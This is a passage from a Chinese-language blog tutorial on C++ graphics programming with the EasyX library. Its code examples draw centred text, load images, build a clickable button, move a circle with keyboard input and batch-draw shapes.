fill_roundrec.eh);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文字设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 绘制文字, 字体默认白色</span></span><br><span class="line"><span class="comment">// 设置文字颜色</span></span><br><span class="line"><span class="built_in">settextcolor</span>(<span class="built_in">RGB</span>(<span class="number">230</span>, <span class="number">103</span>, <span class="number">86</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字样式</span></span><br><span class="line"><span class="comment">// 高度；宽度(0: 自适应)；系统字体</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">20</span>, <span class="number">0</span>, <span class="string">L&quot;楷体&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字背景模式为透明</span></span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 居中输出文字</span></span><br><span class="line"><span class="comment">// L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集</span></span><br><span class="line"><span class="type">wchar_t</span> str[] = <span class="string">L&quot;大家好，我是快乐小凳凳！&quot;</span>;</span><br><span class="line"><span class="comment">// 求字符串宽度</span></span><br><span class="line"><span class="type">int</span> width = <span class="built_in">textwidth</span>(str);</span><br><span class="line"><span class="comment">// 求字符串高度</span></span><br><span class="line"><span class="type">int</span> height = <span class="built_in">textheight</span>(str);</span><br><span class="line"><span class="comment">// 横坐标 = left + ((right - left) - width) / 2</span></span><br><span class="line"><span class="type">int</span> x = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 纵坐标 = top + ((bottom - top) - height) / 2</span></span><br><span class="line"><span class="type">int</span> y = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(x, y, str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留窗口</span></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="comment">// 关闭窗口</span></span><br><span class="line"><span class="built_in">closegraph</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图像加载"><a href="#图像加载" class="headerlink" title="图像加载"></a>图像加载</h2><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><p><img src="https://z1.ax1x.com/2023/09/17/pPhV90K.png" alt="image 20230910115046775"></p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;graphics.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> left;</span><br><span class="line"><span class="type">int</span> top;</span><br><span class="line"><span class="type">int</span> right;</span><br><span class="line"><span class="type">int</span> bottom;</span><br><span class="line"><span class="type">int</span> ew;</span><br><span class="line"><span class="type">int</span> eh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 窗口设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个窗口, 宽640，高480</span></span><br><span class="line"><span class="comment">// initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE);</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">640</span>, <span class="number">480</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置窗口标题</span></span><br><span class="line">HWND hnd = <span class="built_in">GetHWnd</span>();<span class="comment">//获取窗口句柄</span></span><br><span class="line"><span class="built_in">SetWindowText</span>(hnd, <span class="string">L&quot;DQY&amp;WYの小窝&quot;</span>);<span class="comment">//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加载并显示图片 */</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// 图片对象</span></span><br><span class="line">IMAGE img;</span><br><span class="line"><span class="comment">// 加载图片：以CPP文件为起始位置</span></span><br><span class="line"><span class="built_in">loadimage</span>(&amp;img, <span class="string">L&quot;./images/1.jpg&quot;</span>, <span class="number">640</span>, <span class="number">480</span>);</span><br><span class="line"><span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, &amp;img);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文字设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字样式</span></span><br><span class="line"><span class="comment">// 高度；宽度(0: 自适应)；系统字体</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">20</span>, <span class="number">0</span>, <span class="string">L&quot;楷体&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字背景模式为透明</span></span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 居中输出文字</span></span><br><span class="line"><span class="comment">// L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集</span></span><br><span class="line"><span class="type">wchar_t</span> str[] = <span class="string">L&quot;大家好，我是快乐小凳凳！&quot;</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(<span class="number">50</span>, <span class="number">50</span>, str);</span><br><span class="line"><span class="type">wchar_t</span> str1[] = <span class="string">L&quot;欢迎来到DQY&amp;WYの小窝~&quot;</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(<span class="number">50</span>, <span class="number">80</span>, str1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留窗口</span></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="comment">// 关闭窗口</span></span><br><span class="line"><span class="built_in">closegraph</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="设置按钮"><a href="#设置按钮" class="headerlink" title="设置按钮"></a>设置按钮</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">button</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 设置线条样式，设置一次影响后面所有</span></span><br><span class="line"><span class="comment">// 实线；宽度5</span></span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_DASH, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BROWN);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置填充颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(YELLOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绘图</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span> fill_roundrec = &#123; <span class="number">50</span>, <span class="number">150</span>, <span class="number">150</span>, <span class="number">200</span>, <span class="number">10</span>, <span class="number">50</span> &#125;;</span><br><span class="line"><span class="built_in">fillroundrect</span>(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文字设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">settextcolor</span>(BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字样式</span></span><br><span class="line"><span class="comment">// 高度；宽度(0: 自适应)；系统字体</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">20</span>, <span class="number">0</span>, <span class="string">L&quot;楷体&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字背景模式为透明</span></span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 居中输出文字</span></span><br><span class="line"><span class="comment">// L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集</span></span><br><span class="line"><span class="type">wchar_t</span> str[] = <span class="string">L&quot;Button&quot;</span>;</span><br><span class="line"><span class="comment">// 求字符串宽度</span></span><br><span class="line"><span class="type">int</span> width = <span class="built_in">textwidth</span>(str);</span><br><span class="line"><span class="comment">// 求字符串高度</span></span><br><span class="line"><span class="type">int</span> height = <span class="built_in">textheight</span>(str);</span><br><span class="line"><span class="comment">// 横坐标 = left + ((right - left) - width) / 2</span></span><br><span class="line"><span class="type">int</span> x = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 纵坐标 = top + ((bottom - top) - height) / 2</span></span><br><span class="line"><span class="type">int</span> y = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(x, y, str);</span><br><span class="line"></span><br><span class="line">ExMessage msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg, EM_MOUSE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (msg.message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="keyword">if</span> (msg.x &gt;= fill_roundrec.left &amp;&amp; msg.x &lt;= fill_roundrec.right &amp;&amp; msg.y &gt;= fill_roundrec.top &amp;&amp; msg.y &lt;= fill_roundrec.bottom)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;您刚刚在坐标(&quot;</span> &lt;&lt; msg.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; msg.y &lt;&lt; <span class="string">&quot;)按下了左键！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="键盘消息"><a href="#键盘消息" class="headerlink" title="键盘消息"></a>键盘消息</h2><h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><p><img src="https://z1.ax1x.com/2023/09/17/pPhEzOx.png" alt="image 20230911230755039"></p><p><img src="https://z1.ax1x.com/2023/09/17/pPhVikD.png" alt="image 20230911212203622"></p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;easyx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span><span class="comment">// 使用_getch()</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 窗口设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个窗口, 宽640，高480</span></span><br><span class="line"><span class="comment">// initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE);</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">640</span>, <span class="number">480</span>, EW_SHOWCONSOLE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置窗口标题</span></span><br><span class="line">HWND hnd = <span class="built_in">GetHWnd</span>();<span class="comment">//获取窗口句柄</span></span><br><span class="line"><span class="built_in">SetWindowText</span>(hnd, <span class="string">L&quot;欢迎来到DQY&amp;WYの小窝~&quot;</span>);<span class="comment">//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加载并显示图片 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 图片对象</span></span><br><span class="line">IMAGE img;</span><br><span class="line"><span class="comment">// 加载图片</span></span><br><span class="line"><span class="built_in">loadimage</span>(&amp;img, <span class="string">L&quot;./images/1.jpg&quot;</span>, <span class="number">640</span>, <span class="number">480</span>);</span><br><span class="line"><span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, &amp;img);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条样式，设置一次影响后面所有</span></span><br><span class="line"><span class="comment">// 实线；宽度5</span></span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_DASH, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BROWN);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置填充颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(YELLOW);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">50</span>, y = <span class="number">50</span>;</span><br><span class="line">ExMessage msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fillcircle</span>(x, y, <span class="number">50</span>);</span><br><span class="line"><span class="comment">// 键盘消息</span></span><br><span class="line"><span class="type">char</span> key = _getch();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (key)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">72</span>:<span class="comment">// 都代表上键</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;up&quot;</span> &lt;&lt; endl;</span><br><span class="line">--y;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">80</span>:<span class="comment">// 都代表下键</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;down&quot;</span> &lt;&lt; endl;</span><br><span class="line">++y;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">75</span>:<span class="comment">// 都代表左键</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;left&quot;</span> &lt;&lt; endl;</span><br><span class="line">--x;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">77</span>:<span class="comment">// 都代表右键</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;right&quot;</span> &lt;&lt; endl;</span><br><span class="line">++x;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留窗口</span></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="comment">// 关闭窗口</span></span><br><span class="line"><span class="built_in">closegraph</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 键盘消息</span></span><br><span class="line"><span class="keyword">if</span> (_kbhit())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_UP))</span><br><span class="line">&#123;</span><br><span class="line">    y--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_DOWN))</span><br><span class="line">&#123;</span><br><span class="line">    y++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_LEFT))</span><br><span class="line">&#123;</span><br><span class="line">    x--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_RIGHT))</span><br><span class="line">&#123;</span><br><span class="line">    x++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="批量绘制"><a href="#批量绘制" class="headerlink" title="批量绘制"></a>批量绘制</h2><h3 id="函数-3"><a href="#函数-3" class="headerlink" title="函数"></a>函数</h3><p><img src="https://z1.ax1x.com/2023/09/17/pPhVFte.png" alt="image 20230911223028093"></p><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;easyx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span><span class="comment">// 使用_getch()</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> left;</span><br><span class="line"><span class="type">int</span> top;</span><br><span class="line"><span class="type">int</span> right;</span><br><span class="line"><span class="type">int</span> bottom;</span><br><span class="line"><span class="type">int</span> ew;</span><br><span class="line"><span class="type">int</span> eh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 窗口设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个窗口, 宽640，高480</span></span><br><span class="line"><span class="comment">// initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE);</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">640</span>, <span class="number">480</span>, EW_SHOWCONSOLE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置窗口标题</span></span><br><span class="line">HWND hnd = <span class="built_in">GetHWnd</span>();<span class="comment">//获取窗口句柄</span></span><br><span class="line"><span class="built_in">SetWindowText</span>(hnd, <span class="string">L&quot;欢迎来到DQY&amp;WYの小窝~&quot;</span>);<span class="comment">//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加载并显示图片 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 图片对象</span></span><br><span class="line">IMAGE img;</span><br><span class="line"><span class="comment">// 加载图片</span></span><br><span class="line"><span class="built_in">loadimage</span>(&amp;img, <span class="string">L&quot;./images/1.jpg&quot;</span>, <span class="number">640</span>, <span class="number">480</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条样式，设置一次影响后面所有</span></span><br><span class="line"><span class="comment">// 实线；宽度5</span></span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_DASH, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BROWN);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置填充颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(YELLOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绘图</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span> fill_roundrec = &#123; <span class="number">50</span>, <span class="number">150</span>, <span class="number">150</span>, <span class="number">200</span>, <span class="number">10</span>, <span class="number">50</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文字设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">settextcolor</span>(BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字样式</span></span><br><span class="line"><span class="comment">// 高度；宽度(0: 自适应)；系统字体</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">20</span>, <span class="number">0</span>, <span class="string">L&quot;楷体&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字背景模式为透明</span></span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span 